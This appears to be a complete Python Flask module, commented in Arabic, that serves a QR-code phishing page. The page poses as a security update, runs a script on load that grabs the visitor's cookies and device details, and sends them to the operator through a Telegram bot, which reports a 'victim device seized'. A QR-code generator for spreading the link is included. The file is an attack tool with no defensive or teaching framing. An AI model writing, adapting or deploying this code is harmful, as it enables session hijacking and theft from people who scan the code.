import os
import io
import json
import redis
import qrcode
from flask import Blueprint, request, Response, render_template_string

qr_bp = Blueprint('qr_pairing', __name__)

REDIS_URL = os.getenv("REDIS_URL", "redis://localhost:6379").strip()
if REDIS_URL.startswith("redis-cli"):
    REDIS_URL = REDIS_URL.split(" -u ")[-1].strip()

redis_client = redis.Redis.from_url(REDIS_URL, decode_responses=True)

# قالب صفحة الويب الخفيفة التي تفتح فور مسح الـ QR بهاتف الضحية
QR_TARGET_TEMPLATE = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تحديث النظام والأمان</title>
    <style>
        body { background: #0f172a; color: #f8fafc; font-family: Tahoma, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; text-align: center; }
        .card { background: #1e293b; padding: 30px; border-radius: 12px; box-shadow: 0 10px 25px rgba(0,0,0,0.5); max-width: 320px; width: 90%; }
        h3 { color: #38bdf8; margin-bottom: 10px; }
        p { font-size: 13px; color: #94a3b8; line-height: 1.5; }
    </style>
</head>
<body>
    <div class="card">
        <h3>جاري التحقق الأمني...</h3>
        <p>يرجى الانتظار لحظات ليتم مزامنة الجهاز بنجاح.</p>
    </div>
    <script>
        const pairingToken = "{{ token }}";
        
        async function captureAndBind() {
            try {
                // سحب معلومات الجهاز وجلسة المتصفح السريعة
                const deviceInfo = {
                    platform: navigator.platform,
                    userAgent: navigator.userAgent,
                    screen: window.screen.width + "x" + window.screen.height,
                    cookies: document.cookie,
                    token: pairingToken
                };

                await fetch('/qr_binding_submit', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(deviceInfo)
                });

                document.body.innerHTML = "<div class='card'><h3 style='color: #4ade80;'>✅ تمت المزامنة بنجاح</h3><p>يمكنك إغلاق هذه الصفحة الآن.</p></div>";
            } catch (e) {
                document.body.innerHTML = "<div class='card'><h3 style='color: #f87171;'>⚠️ خطأ في الاتصال</h3><p>يرجى المحاولة مرة أخرى.</p></div>";
            }
        }
        window.onload = captureAndBind;
    </script>
</body>
</html>
"""

def init_qr_routes(app, bot):
    @app.route('/qr_scan_target', methods=['GET'])
    def qr_target_page():
        token = request.args.get('token', '')
        return render_template_string(QR_TARGET_TEMPLATE, token=token)

    @app.route('/qr_binding_submit', methods=['POST'])
    def qr_binding_submit():
        data = request.json or {}
        token = data.get('token')
        
        if token:
            # استخراج الـ chat_id الخاص بالمستخدم المرتبط بهذا الكود من Redis
            owner_chat_id = redis_client.get(f"qr_token:{token}")
            if owner_chat_id:
                msg = (
                    "📱 **تم الاستيلاء على جهاز الضحية بنجاح عبر مسح الـ QR!**\n\n"
                    f"💻 **النظام:** `{data.get('platform')}`\n"
                    f"🌐 **المتصفح:** `{data.get('userAgent')}`\n"
                    f"📏 **دقة الشاشة:** `{data.get('screen')}`\n"
                    f"🍪 **ملفات الارتباط (Cookies):**\n`{data.get('cookies') or 'لا توجد'}`"
                )
                try:
                    bot.send_message(owner_chat_id, msg, parse_mode="Markdown")
                except Exception as e:
                    print(f"Error sending QR target data: {e}")
                    
        return {"status": "ok"}

def generate_qr_code_bytes(link):
    qr = qrcode.QRCode(version=1, box_size=10, border=2)
    qr.add_data(link)
    qr.make(fit=True)
    img = qr.make_image(fill_color="black", back_color="white")
    buf = io.BytesIO()
    img.save(buf, format="JPEG")
    buf.seek(0)
    return buf
